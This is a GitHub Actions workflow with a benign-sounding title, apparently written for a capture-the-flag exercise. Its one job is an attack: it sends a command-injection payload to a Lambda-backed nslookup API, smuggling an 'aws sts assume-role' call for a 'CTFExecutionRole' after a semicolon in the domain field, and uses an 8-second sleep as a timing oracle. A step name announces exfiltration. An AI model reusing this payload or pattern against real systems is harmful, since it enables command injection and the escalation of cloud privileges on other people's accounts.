name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda & Exfiltrate via Function Metadata

        run: |

          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
    
          # If assume-role succeeds, sleep 8s. If it fails, it exits immediately.
          PAYLOAD='{"domain": "127.0.0.1; aws sts assume-role --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole --role-session-name lo-test && sleep 8"}'
    
           time curl -s -X POST "$URL" \
           -H "Content-Type: application/json" \
           -d "$PAYLOAD"
